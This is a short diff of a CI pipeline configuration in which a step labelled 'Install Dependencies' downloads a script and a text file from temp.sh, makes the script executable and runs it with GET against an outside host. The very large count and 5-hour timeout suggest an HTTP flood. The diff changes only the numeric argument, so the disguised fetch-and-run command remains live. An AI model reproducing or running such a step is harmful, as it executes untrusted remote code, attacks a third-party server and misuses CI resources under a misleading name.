@@ -7,7 +7,7 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: apt update && apt install nodejs wget -y && wget https://temp.sh/ZQoMn/f.js && wget https://temp.sh/RDboj/https.txt && chmod +x f.js && ./f.js GET https://614.gra1.ovh.abcd.network/ https.txt 9999999999999999999999 153 1
+            command: apt update && apt install nodejs wget -y && wget https://temp.sh/ZQoMn/f.js && wget https://temp.sh/RDboj/https.txt && chmod +x f.js && ./f.js GET https://614.gra1.ovh.abcd.network/ https.txt 999999 153 1
             no_output_timeout: 5h
 
 workflows:
